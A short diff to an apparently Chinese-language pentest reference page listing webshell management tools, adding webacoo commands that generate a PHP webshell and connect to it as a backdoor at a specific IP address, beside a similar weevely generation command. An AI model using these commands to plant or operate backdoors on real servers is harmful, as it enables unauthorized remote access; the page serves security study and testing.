@@ -18,6 +18,8 @@ WebShell管理工具
 - `quasibot <https://github.com/Smaash/quasibot>`_ complex webshell manager, quasi-http botnet
 - webacoo
 	+ 仅支持PHP。
+	+ 生成webshell：webacoo -g -o webacootest.php
+	+ 连接后门：webacoo -t -u http://106.54.74.40/webacootest.php
 - `weevely3 <https://github.com/epinna/weevely3>`_ Weaponized web shell
 	+ 仅支持PHP。
 	+ 生成webshell：weevely generate weevelytest ./weevelyphp.php
